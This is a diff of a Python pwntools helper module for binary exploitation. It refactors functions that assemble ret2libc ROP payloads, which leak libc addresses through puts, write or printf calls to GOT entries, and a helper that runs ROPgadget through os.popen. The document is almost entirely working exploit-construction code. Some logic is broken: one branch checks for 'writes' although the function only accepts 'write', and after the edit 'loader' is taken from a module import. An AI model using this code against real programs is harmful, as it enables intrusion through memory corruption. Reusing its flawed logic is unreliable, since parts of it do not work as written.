@@ -1,6 +1,9 @@
 from pwn import *
 import os
 import subprocess
+from helper import loader
+from collections import defaultdict as dd
+
 def get_output(s):
     info(f"running cmd: {s}")
     res = int(os.popen(s).readlines()[0][:-1],16)
@@ -11,12 +14,14 @@ def rop(root, code):
     cmd = f"ROPgadget --binary {root} | grep ': {code}' | cut -d ' ' -f 1"
     return get_output(cmd)
 
-def ret2libc_A(tool:str,to_leak:str,next:int,fill2ret,loader,fmt_str=0):
+def ret2libc_A(tool:str,next:int,fill2ret,fmt_str=0,**kwargs):
     """
     ** if you use printf as tool, you need to find fmt_str **
     for example: 
         use [puts](exec puts' plt) to show addr of [__malloc_hook]   
     """
+    kwargs = dd(str,kwargs)
+    to_leak = kwargs['to_leak'] if kwargs['to_leak'] else tool
     elf = loader.elf
     if tool not in ['puts','write','printf']:
         warning(f"I never use this func to leak addr of libc: {tool}")
@@ -25,7 +30,10 @@ def ret2libc_A(tool:str,to_leak:str,next:int,fill2ret,loader,fmt_str=0):
         info("using i386 ret2libc auto...")
         psize = p32
         if tool == "puts":
-            payload = fill2ret+psize(elf.plt[tool])+psize(next)+psize(elf.got[to_leak])
+            payload = fill2ret
+            payload+=psize(elf.plt[tool])
+            payload+=psize(next)
+            payload+=psize(elf.got[to_leak])
         elif tool == "writes":
             payload = fill2ret+psize(elf.plt[tool])+psize(next)+psize(1)+psize(elf.got[to_leak])+p32(4)
         elif tool == "printf":
@@ -57,7 +65,7 @@ def ret2libc_A(tool:str,to_leak:str,next:int,fill2ret,loader,fmt_str=0):
                       psize(elf.plt[tool])+psize(next)
     return payload
 
-def ret2libc_B(to_leak:str,leak_addr,libc,fill2ret,loader):
+def ret2libc_B(to_leak:str,leak_addr,libc,fill2ret):
     """
     to_leak:    func_name
     leak_addr:  addr(int)
